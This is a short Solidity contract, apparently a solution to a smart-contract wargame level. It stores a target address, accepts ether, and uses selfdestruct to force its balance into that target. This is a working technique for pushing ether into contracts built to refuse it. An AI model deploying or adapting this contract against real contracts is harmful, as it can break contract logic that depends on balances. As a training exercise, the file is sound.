// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {

    address force;

    constructor(address _force) {
        force = _force;
    }

    function explode() external {
        selfdestruct(payable(force));
    }

    receive() payable external {}
}
